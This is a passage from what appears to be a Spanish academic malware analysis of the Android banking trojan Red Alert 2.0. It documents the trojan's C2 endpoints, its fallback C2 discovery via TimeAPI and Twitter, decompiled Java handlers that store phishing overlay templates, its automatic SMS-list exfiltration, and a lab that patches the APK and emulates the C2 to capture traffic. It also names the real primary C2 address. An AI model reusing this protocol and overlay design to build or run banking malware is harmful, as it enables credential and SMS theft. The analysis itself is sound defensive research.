+<!doctype html><html><head><meta charset="utf-8"><title>Entidad de laboratorio</title></head><body><h1>Acceso de laboratorio</h1><form><label>Usuario <input name="usuario"></label><label>Clave <input name="clave" type="password"></label><button type="button">Entrar</button></form><script>document.body.setAttribute("data-laboratorio","ejecutado");</script></body></html>
+```
+
+Este documento imita de forma inocua una pantalla de acceso, contiene JavaScript en línea y no solicita recursos externos. El lector HTTP concatena las líneas sin reinsertar sus separadores, por lo que conviene servir el documento en una sola línea, como en el ejemplo, o evitar construcciones JavaScript que dependan de saltos de línea, como los comentarios `//`.
+
+Después de recibir esa cadena, el manejador almacena:
+
+```text
+templateName = <PAQUETE_OBJETIVO>
+html = <HTML_PRINCIPAL>
+entered = 0
+sended = 0
+```
+
+Si la fila todavía no existe, la inserta; si existe, actualiza `templateName` y `html`.
+
+El manejador `com.kmc.prod.b.d`, recuperado como [`GetTmpltHandler_xv3.java`]{.content-visible unless-format="pdf"}[`\nolinkurl{GetTmpltHandler_xv3.java}`{=latex}]{.content-visible when-format="pdf"}, enlaza la respuesta HTML con el almacenamiento y con la descarga técnica:
+
+```java
+public final void a(String str, Context context) {
+    if (context == null) {
+        throw new RuntimeException("null context");
+    }
+    if (str == null || str.isEmpty()) {
+        throw new RuntimeException("bad template in resposne");
+    }
+    if (!com.kmc.prod.c.a.a(context).b(str, this.b)) {
+        throw new RuntimeException(
+                "template " + this.b + " didn't saved");
+    }
+    if (this.c != null) {
+        com.kmc.prod.d.a.a(context).a(this.b, this.c);
+    }
+}
+```
+
+El parámetro `str` es el cuerpo devuelto por el primer `/gt`; `this.b` es el nombre de la plantilla y `this.c` conserva el selector técnico. La llamada a la base de datos se ejecuta antes de comprobar `this.c`. Por eso la segunda descarga solo se inicia después de almacenar el HTML principal.
+
+El método de persistencia tampoco analiza el contenido. Copia directamente ambos argumentos en `ContentValues` y actualiza o inserta la fila:
+
+```java
+ContentValues contentValues = new ContentValues();
+contentValues.put("templateName", str2);
+contentValues.put("html", str);
+jUpdate = writableDatabase.update(
+        "template",
+        contentValues,
+        " templateName like ? ",
+        new String[]{str2});
+if (jUpdate == 0) {
+    jUpdate = writableDatabase.insert(
+            "template", null, contentValues);
+}
+```
+
+En este método, `str2` es el nombre de la plantilla y `str` es la respuesta completa de `/gt`, después de que el lector haya eliminado los separadores de línea.
+
+Los campos `entered` y `sended` describen estados posteriores que todavía no han ocurrido: `entered` indica si el usuario ya ha enviado datos desde la plantilla y `sended` indica si esos datos ya se han remitido al C2. Ambos comienzan en cero.
+
+#### Segunda solicitud `/gt`: descarga y almacenamiento de la plantilla técnica
+
+Después de almacenar satisfactoriamente la plantilla principal, y dentro de la cadena del mismo manejador, la presencia de `<PAQUETE_OBJETIVO>2` provoca otra solicitud:
+
+```http
+POST /gt HTTP/1.1
+Host: 192.168.56.20:8060
+Accept: text/html,application/xhtml+xml,application/xml,application/json;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: <longitud de SELECTOR_TECNICO>
+
+<SELECTOR_TECNICO>
+```
+
+Tampoco hay Base64. La respuesta debe ser `200` y contener un cuerpo no vacío. Igual que en la descarga principal, el cliente no valida la sintaxis HTML: para que la variante pueda mostrarse correctamente, el servidor de laboratorio debe proporcionar otro documento HTML autocontenido que siga siendo utilizable después de eliminar los separadores de línea. El manejador actualiza la misma fila:
+
+```text
+technicalWorkHtml = <HTML_TECNICO>
+```
+
+El segundo `/gt` usa el mismo método HTTP, pero entrega su respuesta al manejador `com.kmc.prod.b.c`, recuperado como `GetTmpltHandler2.java`:
+
+```java
+public final void a(String str, Context context) {
+    if (context == null) {
+        throw new RuntimeException("null context");
+    }
+    if (str == null || str.isEmpty()) {
+        throw new RuntimeException("bad template in resposne");
+    }
+    if (!com.kmc.prod.c.a.a(context).c(this.b, str)) {
+        throw new RuntimeException(
+                "template technical works"
+                + this.b
+                + " didn't saved");
+    }
+}
+```
+
+En esta ocasión, `str` es `<HTML_TECNICO>` y `this.b` es el nombre de la misma plantilla. La distinta llamada a la base de datos, `c(this.b, str)`, actualiza `technicalWorkHtml` en lugar de `html`.
+
+Las dos descargas están ordenadas: la segunda se invoca desde el manejador que ya ha guardado la primera. Los selectores y ambos documentos HTML son valores del servidor.
+
+#### Tráfico automático posterior al registro: `/sy`, `/ssl` y `/ucs`
+
+La alarma general que inició los intentos de registro no se cancela cuando `isRegistered` pasa a valer `1`. En Android 4.4 continúa venciendo cada 20 segundos. En el primer vencimiento posterior al registro, [`SchedulerExecutor.onReceive`]{.content-visible unless-format="pdf"}[`\nolinkurl{SchedulerExecutor.onReceive}`{=latex}]{.content-visible when-format="pdf"} inicia en un hilo la consulta periódica de órdenes y, de forma independiente, arranca el servicio que procesa las acciones pendientes. Estas operaciones también pueden coincidir con `/sban` o `/gt`, porque la comprobación de plantillas utiliza otra alarma.
+
+La consulta de órdenes produce `POST /sy`. Su JSON contiene `bot_id`, `imei`, `type = "sy"` e `is_admin`, y la rutina general lo codifica mediante `Base64.DEFAULT`. Esta variante establece las mismas cabeceras explícitas descritas para `/stbi`, incluida la longitud de la cadena Base64, y mantiene el tiempo máximo de lectura de 30 segundos. Para conservar el estado limpio sin introducir una orden remota, el C2 de laboratorio debe responder con el código `200` y el cuerpo `OK`. El manejador compara ese cuerpo sin distinguir mayúsculas de minúsculas, lo acepta sin crear órdenes y no inicia `/sban` ni `/gt`.
+
+En ese mismo vencimiento no se produce `/std`, porque todavía no existen datos introducidos en una plantilla, ni se transmite la tabla `smsList`, porque comienza vacía. Sin embargo, la respuesta correcta anterior a `/stbi` sí ha activado otra acción. Como se mostró en `RegisterDeviceResponse`, después de guardar el identificador del bot se ejecuta la llamada ofuscada `a(true)`. Esta llamada pone `getSmsList = 1` y `getSmsListCommandExecuted = 0`, de modo que la APK considera pendiente el envío de la lista de SMS sin haber recibido el comando `getSmsList` mediante `/sy`.
+
+Cuando el servicio procesa esa marca, genera automáticamente `POST /ssl`, aunque la lista de SMS del dispositivo esté vacía. El cuerpo contiene un JSON con `sms_list`, `type = "ssl"`, `bot_id` e `imei`, codificado mediante `Base64.DEFAULT`. `/ssl` utiliza la misma variante HTTP que `/stbi` y `/sy`, por lo que establece expresamente `Content-Length` y el mismo conjunto de cabeceras. La solicitud forma parte del comportamiento de la APK; el laboratorio decide responder con `200 OK` para permitir que la secuencia avance hasta `/ucs`.
+
+El escenario representado reproduce también esta rama. Por ello, el servidor responde a `/ssl` con el código `200` y el cuerpo `OK`. Solo después de aceptar esa respuesta la APK marca `getSmsList` como ejecutada y envía `POST /ucs` para confirmar su ejecución al C2. Si `/ssl` no recibiera esa respuesta, `/ucs` no aparecería, pero esa interrupción no afectaría a las tres técnicas seleccionadas.
+
+El cuerpo de `/ucs`, también codificado mediante `Base64.DEFAULT`, contiene `bot_id`, `imei`, `command = "getSmsList"` y `type = "ucs"`. El código intenta añadir además `command_sig`, pero el campo permanece nulo porque esta acción no se ha recibido mediante `/sy`; por ello, la propiedad no aparece en el JSON. `/ucs` utiliza la variante HTTP que no establece `Content-Length` de forma explícita, aunque `HttpURLConnection` puede calcularlo al materializar la petición. La solicitud requiere una respuesta con código `200`. El cliente lee su cuerpo, pero no valida el contenido.
+
+#### Secuencia comunicativa
+
+El diagrama representa la secuencia forzada que alcanza las tres técnicas seleccionadas y el tráfico que puede producir el primer vencimiento general posterior al registro. El bloque `par` refleja que la descarga de plantillas, la consulta `/sy` y la acción automática `getSmsList` se inician desde tareas diferentes y no tienen un orden relativo garantizado. La respuesta `OK` a `/sy` evita introducir órdenes remotas. No se dibujan `/std` ni el envío de la tabla `smsList` porque, en el estado limpio seleccionado, sus consultas locales no encuentran datos pendientes y no generan mensajes de red.
+
+```{=latex}
+\clearpage
+```
+
+```{mermaid}
+%%| label: fig-redalert-resolucion
+%%| fig-cap: "Fallo del C2 primario y resolución del C2 alternativo de RedAlert 2.0."
+%%| fig-width: 6.0
+sequenceDiagram
+    participant A as APK Red Alert 2.0
+    participant D as Resolución DNS
+    participant P as Dirección primaria no implementada<br/>146.0.72.85:7878
+    participant T as TimeAPI<br/>www.timeapi.org:80
+    participant X as Twitter<br/>twitter.com:443
+    participant C as C2 alternativo<br/>192.168.56.20:8060
+
+    A->>A: Crear SQLite y guardar domain=146.0.72.85:7878<br/>isRegistered=NULL y uid=NULL
+    Note over A: Primer vencimiento aproximado a los 3 s
+
+    A->>P: TCP SYN hacia 146.0.72.85:7878
+    Note over A,P: La dirección primaria no responde y la conexión termina con una excepción
+    Note over A,P: El cliente prepara POST /stbi y el cuerpo de registro<br/>pero no transmite HTTP porque no se completa el saludo TCP
+    Note over A: La excepción con conectividad activa invoca el resolver de respaldo
+
+    A->>D: Consulta DNS de www.timeapi.org<br/>A y/o AAAA según la pila Android
+    D-->>A: Dirección asociada a www.timeapi.org
+    A->>T: GET /utc/now?%5CD HTTP :80<br/>sin cuerpo, Accept y Accept-Language
+    T-->>A: HTTP 200<br/>body=2024-01-02T03:04:05+00:00
+    Note over A: MD5(texto+hash)=86d08d31c9d47332a26dbb0d22001186<br/>identificador=86d08d31c9d4733
+
+    A->>D: Consulta DNS de twitter.com<br/>A y/o AAAA según la pila Android
+    D-->>A: Dirección asociada a twitter.com
+    A->>X: Establecer TCP con twitter.com:443
+    A->>X: Negociar TLS<br/>HostnameVerifier y X509TrustManager permisivos
+    A->>X: GET /86d08d31c9d4733 HTTPS :443<br/>sin cuerpo, redirecciones predeterminadas admitidas
+    X-->>A: HTTP 200<br/>primer tweet-text = 192.168 56.20
+    Note over A: El texto recibido produce http://192.168.56.20:8060
+```
+
+```{=latex}
+\clearpage
+```
+
+
+```{=latex}
+\clearpage
+```
+
+```{mermaid}
+%%| label: fig-redalert-registro
+%%| fig-cap: "Validación y registro de RedAlert 2.0 en el C2 alternativo."
+%%| fig-width: 6.0
+sequenceDiagram
+    participant A as APK Red Alert 2.0
+    participant C as C2 alternativo<br/>192.168.56.20:8060
+
+    Note over A,C: 192.168.56.20 es una IPv4 privada y controlada<br/>No se realiza DNS para este destino
+    A->>C: Establecer TCP con 192.168.56.20:8060
+    A->>C: POST /ping :8060<br/>cuerpo=cGluZw== + LF, Content-Length=9
+    C-->>A: HTTP 200<br/>cuerpo leído pero ignorado
+    A->>A: Persistir domain=http://192.168.56.20:8060 en SQLite
+    Note over A: El éxito de /ping cambia el dominio, pero no registra el dispositivo
+
+    A->>C: POST /stbi :8060<br/>cuerpo=Base64.DEFAULT(JSON de registro)
+    C-->>A: HTTP 200<br/>cuerpo=BOT_ID_LAB
+    A->>A: Persistir uid=BOT_ID_LAB e isRegistered=1<br/>marcar getSmsList como pendiente
+    A->>A: Iniciar las tareas posteriores al registro
+```
+
+```{=latex}
+\clearpage
+```
+
+
+```{=latex}
+\clearpage
+```
+
+```{mermaid}
+%%| label: fig-redalert-plantillas
+%%| fig-cap: "Rama concurrente de descarga de plantillas de RedAlert 2.0."
+%%| fig-width: 6.0
+sequenceDiagram
+    participant A as APK Red Alert 2.0
+    participant C as C2 alternativo<br/>192.168.56.20:8060
+
+    Note over A,C: Descarga de plantillas iniciada por NdiHandler
+        A->>A: Leer bot_id y enumerar aplicaciones no pertenecientes a /system/
+        A->>C: POST /sban :8060<br/>cuerpo=Base64.DEFAULT(JSON con templates_names,<br/>bot_id, imei, type=sban y lang)
+        C-->>A: HTTP 200<br/>objeto con selector principal y selector técnico
+        A->>C: POST /gt :8060<br/>cuerpo directo=SELECTOR_PRINCIPAL, sin Base64
+        C-->>A: HTTP 200<br/>HTML_PRINCIPAL no vacío y autocontenido
+        A->>A: Guardar HTML_PRINCIPAL en SQLite
+        A->>C: POST /gt :8060<br/>cuerpo directo=SELECTOR_TECNICO, sin Base64
+        C-->>A: HTTP 200<br/>HTML_TECNICO no vacío y autocontenido
+        A->>A: Guardar HTML_TECNICO en SQLite
+        A->>A: Detectar la aplicación objetivo en primer plano<br/>cargar el HTML guardado en el WebView y ejecutar JavaScript
+```
+
+```{=latex}
+\clearpage
+```
+
+```{mermaid}
+%%| label: fig-redalert-ordenes
+%%| fig-cap: "Rama concurrente de consulta periódica de órdenes de RedAlert 2.0."
+%%| fig-width: 6.0
+sequenceDiagram
+    participant A as APK Red Alert 2.0
+    participant C as C2 alternativo<br/>192.168.56.20:8060
+
+        Note over A,C: Consulta periódica de órdenes
+        A->>C: POST /sy :8060<br/>cuerpo=Base64.DEFAULT(JSON con bot_id,<br/>imei, type=sy e is_admin)
+        C-->>A: HTTP 200<br/>cuerpo=OK, sin órdenes nuevas
+```
+
+```{=latex}
+\clearpage
+```
+
+```{mermaid}
+%%| label: fig-redalert-sms
+%%| fig-cap: "Rama concurrente de envío automático de la lista de SMS de RedAlert 2.0."
+%%| fig-width: 6.0
+sequenceDiagram
+    participant A as APK Red Alert 2.0
+    participant C as C2 alternativo<br/>192.168.56.20:8060
+
+        Note over A,C: Envío automático de la lista de SMS
+        A->>C: POST /ssl :8060<br/>cuerpo=Base64.DEFAULT(JSON con sms_list,<br/>type=ssl, bot_id e imei)
+        C-->>A: HTTP 200<br/>cuerpo=OK
+        A->>A: Marcar getSmsList como ejecutada<br/>y dejar su confirmación pendiente
+        A->>C: POST /ucs :8060<br/>cuerpo=Base64.DEFAULT(JSON con command=getSmsList,<br/>sin command_sig)
+        C-->>A: HTTP 200<br/>cuerpo leído pero no validado
+```
+
+```{=latex}
+\clearpage
+```
+
+
+#### Laboratorio de generación del PCAP
+
+La ejecución completa requiere parchear la APK original. El análisis con JADX mostró que la clase ofuscada `a.a.b.m` busca los recursos [`entities-base.properties`]{.content-visible unless-format="pdf"}[`\nolinkurl{entities-base.properties}`{=latex}]{.content-visible when-format="pdf"} y [`entities-full.properties`]{.content-visible unless-format="pdf"}[`\nolinkurl{entities-full.properties}`{=latex}]{.content-visible when-format="pdf"} dentro de `a/a/b/`, pero la APK los conserva en `org/jsoup/nodes/`. La búsqueda devuelve `null` y provoca una [`ExceptionInInitializerError`]{.content-visible unless-format="pdf"}[`\nolinkurl{ExceptionInInitializerError}`{=latex}]{.content-visible when-format="pdf"} al inicializar el analizador HTML empleado por la muestra.
+
+El parche duplica ambos recursos en las rutas esperadas por la clase. No modifica `classes.dex`, `AndroidManifest.xml`, `resources.arsc` ni el comportamiento de red. La APK resultante se alineó y firmó mediante `zipalign` y `apksigner`:
+
+```text
+Muestra\Parche\RedAlert2.0-patched-entities.apk
+```
+
+El laboratorio ejecuta la APK parcheada en el AVD `TFG_TeleRAT_API19`. Android Emulator permanece en Windows y Kali WSL aloja las entidades controladas.
+
+| Entidad | Dirección y servicio | Procedencia |
+|---|---|---|
+| DNS controlado | `10.230.39.53:53` | Dirección privada asignada al resolutor del laboratorio. |
+| TimeAPI emulada | `10.230.39.10:80` | Dirección privada elegida para reproducir `www.timeapi.org`. Representa un servicio legítimo y no es un IOC. |
+| Twitter emulado | `10.230.39.11:443` | Dirección privada elegida para entregar el texto del C2 alternativo. Representa un servicio legítimo abusado y no es un IOC. |
+| Dirección primaria | `146.0.72.85:7878` | IP y puerto incrustados en el recurso `domain` de la APK analizada. Es el único indicador público de infraestructura utilizado por este escenario. El *namespace* descarta silenciosamente el tráfico para provocar la ruta de respaldo sin emitir un RST. |
+| C2 alternativo | `192.168.56.20:8060` | Dirección privada del escenario original, suministrada por Twitter como `192.168 56.20` y completada por la muestra con TCP/8060. Es una decisión controlada del laboratorio y no un IOC atribuido a RedAlert 2.0. |
+
+`redalert_server.py` conserva los valores del servidor original: TimeAPI responde con [`2024-01-02T03:04:05+00:00`]{.content-visible unless-format="pdf"}[`\nolinkurl{2024-01-02T03:04:05+00:00}`{=latex}]{.content-visible when-format="pdf"}, Twitter publica el identificador `86d08d31c9d4733` y el C2 implementa `/ping`, `/stbi`, `/sban`, `/gt`, `/sy`, `/ssl` y `/ucs`. Las dos respuestas de `/gt` son documentos HTML inocuos y autocontenidos. Twitter utiliza el certificado del laboratorio original; la muestra acepta su cadena y su nombre mediante sus validadores permisivos. El pipeline guarda el certificado, su clave privada y `redalert-sslkeys.log` junto al PCAP.
+
+Antes de repetir el escenario deben borrarse los datos de `com.kmc.prod` o reinstalarse la aplicación: la base SQLite conserva el C2 alternativo y el estado de registro, de modo que una ejecución sin limpiar omitiría el resolver.
+
+
+La evidencia esperada comprende los `SYN` sin respuesta hacia `146.0.72.85:7878`, las consultas y respuestas DNS, la petición HTTP a TimeAPI, la consulta HTTPS a Twitter, la validación `/ping`, el registro `/stbi`, el catálogo `/sban`, dos descargas `/gt` y las comunicaciones posteriores `/sy`, `/ssl` y `/ucs`. Los resultados se almacenan en [`android-smoke/<fecha-hora>/redalert/`]{.content-visible unless-format="pdf"}[`\nolinkurl{android-smoke/<fecha-hora>/redalert/}`{=latex}]{.content-visible when-format="pdf"}.
+
